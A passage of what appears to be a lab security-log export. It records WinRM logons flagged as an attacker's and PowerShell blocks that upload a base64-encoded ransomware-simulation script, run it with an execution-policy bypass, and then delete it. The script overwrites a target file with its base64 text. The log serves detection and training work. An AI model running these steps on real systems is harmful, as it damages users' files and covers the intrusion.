zc2FnZSkiCn0Kcwo=')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aClzCiAgICAKICAgICMgRW5jb2RlIEJhc2U2NCAobcO0IHBo4buPbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIEdoaSDEkcOoIG7hu5lpIGR1bmcgQmFzZTY0IHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKICAgIFNldC1Db250ZW50IC1QYXRoICRQYXRoIC1WYWx1ZSAkYmFzZTY0Q29udGVudCAtRW5jb2RpbmcgVVRGOAogICAgCiAgICBXcml0ZS1Ib3N0ICJbK10gVGjDoG5oIGPDtG5nISBGaWxlIMSRw6MgYuG7iyAnbcOjIGjDs2EnIChCYXNlNjQpLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGhp4buHbiB04bqhaTogJFBhdGgiCgp9IGNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJH4bq3cCBs4buXaTogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCn0Kcwo=')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.171+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.203+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:20.197+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null"," powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
 powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:52.893+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:10:52.928+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","rm encrypt1.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm encrypt1.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:11:16.856+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:11:16.882+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T08:11:17.010+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_b1s1ulwb.jzb.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_b1s1ulwb.jzb.ps1","null
null"
"2025-11-16T08:11:17.279+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""1cdf69eb24b18a7f4ad2f036c83493ca58527518"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""1cdf69eb24b18a7f4ad2f036c83493ca58527518"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:11:17.285+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T08:11:17.298+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T08:11:17.304+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T08:11:17.393+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:11:17.398+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt1.ps1
C:\Program Files\encrypt1.ps1","null
null"
"2025-11-16T08:11:17.486+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:11:17.527+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:12:20.764+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:12:20.786+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T08:12:20.890+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ulfb4ujw.nj3.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_ulfb4ujw.nj3.ps1","null
null"
"2025-11-16T08:12:21.121+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""992d546fe1dd40245d3dc46da3cddd660197c2c4"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""992d546fe1dd40245d3dc46da3cddd660197c2c4"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:12:21.126+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T08:12:21.137+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T08:12:21.144+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T08:12:21.186+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
